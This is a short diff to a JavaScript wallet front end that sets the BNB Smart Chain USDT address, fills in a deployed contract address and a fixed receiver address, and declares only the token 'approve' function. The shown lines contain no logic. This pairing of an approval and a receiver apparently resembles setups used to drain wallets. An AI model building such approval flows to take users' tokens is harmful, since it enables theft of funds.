@@ -4,7 +4,7 @@ import { ethers } from "ethers";
 import EthereumProvider from "@walletconnect/ethereum-provider";
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS_HERE";
+const CONTRACT_ADDRESS = "0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8";
 const RECEIVER_ADDRESS = "0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed";
 const USDT_ABI = [
   "function approve(address spender, uint amount) public returns (bool)"
